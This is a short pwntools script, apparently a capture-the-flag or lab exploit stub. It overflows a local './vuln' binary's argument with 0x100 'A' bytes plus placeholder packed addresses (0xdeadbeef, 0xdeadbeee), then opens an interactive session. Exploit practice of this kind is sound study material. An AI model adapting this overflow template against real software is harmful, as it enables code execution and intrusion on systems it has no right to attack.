from pwn import *

payload = 'A' * 0x100
payload += p32(0xdeadbeef)
payload += p32(0xdeadbeee)
payload += p32(0xdeadbeee)
payload += p32(0xdeadbeee)
sock = process(["./vuln", payload])

sock.interactive()
